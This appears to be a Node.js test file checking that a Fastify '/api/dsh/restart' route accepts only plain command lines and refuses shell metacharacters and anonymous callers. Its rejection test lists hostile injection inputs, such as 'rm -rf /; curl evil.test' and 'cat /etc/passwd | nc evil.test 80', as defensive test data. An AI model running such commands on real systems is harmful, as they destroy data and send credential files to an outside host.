// The restart handoff writes caller text into the tenant's own process, so the
// route accepts only a plain command line (SEC-007).
import { test } from 'node:test'
import assert from 'node:assert/strict'
import Fastify from 'fastify'
import { dshRoutes } from '../lib/web/routes/dsh.js'
import { hashSessionToken, newSessionToken } from '../lib/web/auth.js'
import { signSessionCookie } from '../lib/web/session-cookie.js'

const SECRET = 'restart-test-session-secret-32-characters'

function makeApp(handoffs) {
  const app = Fastify()
  const user = {
    id: 'user-1',
    username: 'alice',
    role: 'active',
    home_dir: '/tmp/alice',
    api_key_ref: null,
    created_at: Date.now(),
    approved_by: null,
    uid: 100001,
    supabase_sub: 'sub-1',
  }
  const knownSessions = new Map()
  const jti = newSessionToken()
  knownSessions.set(hashSessionToken(jti), { expiresAt: Date.now() + 60_000, user })

  app.decorate('db', {
    findUserById: async (id) => ({ id, username: 'alice', role: 'active' }),
    findSessionWithUser: async (tokenHash) => knownSessions.get(tokenHash),
  })
  app.decorate('config', {
    baseDomain: 'app.test',
    dataRoot: '/tmp/dsh-restart-test',
    sessionSecret: SECRET,
    sessionTtlSeconds: 3600,
    secureCookies: false,
    cookieDomain: '',
  })
  app.decorate('userFs', {
    writeHandoff: async (_userId, content) => { handoffs.push(content) },
  })
  app.decorate('supervisor', {
    restartMain: async () => ({ id: 'inst-1', port: 1234, status: 'starting' }),
    spawnWatchdog: async () => {},
    launch: async () => ({ id: 'inst-1', port: 1234, status: 'starting' }),
    stop: async () => {},
    status: async () => ({ status: 'stopped' }),
  })
  app.decorateRequest('user', null)
  app.register(dshRoutes)

  const cookie = 'sid=' + signSessionCookie(
    { u: user.id, s: user.supabase_sub, n: user.username, jti, iat: Math.floor(Date.now() / 1000) },
    SECRET,
  )
  return { app, cookie }
}

test('restart: accepts a plain command line', async () => {
  const handoffs = []
  const { app, cookie } = makeApp(handoffs)
  const res = await app.inject({
    method: 'POST',
    url: '/api/dsh/restart',
    headers: { cookie },
    payload: { command: 'dsh --profile web' },
  })
  assert.equal(res.statusCode, 200)
  assert.equal(handoffs.length, 1)
  await app.close()
})

test('restart: refuses shell metacharacters', async () => {
  const handoffs = []
  const { app, cookie } = makeApp(handoffs)
  for (const command of ['rm -rf /; curl evil.test', 'echo $(id)', 'cat /etc/passwd | nc evil.test 80', 'a`id`b', 'a>b', 'a&b']) {
    const res = await app.inject({
      method: 'POST',
      url: '/api/dsh/restart',
      headers: { cookie },
      payload: { command },
    })
    assert.equal(res.statusCode, 400, command)
    assert.equal(res.json().error, 'invalid_command')
  }
  assert.equal(handoffs.length, 0)
  await app.close()
})

test('restart: rejects an anonymous caller before the command check', async () => {
  const handoffs = []
  const { app } = makeApp(handoffs)
  const res = await app.inject({
    method: 'POST',
    url: '/api/dsh/restart',
    payload: { command: 'dsh --profile web' },
  })
  assert.equal(res.statusCode, 401)
  assert.equal(handoffs.length, 0)
  await app.close()
})
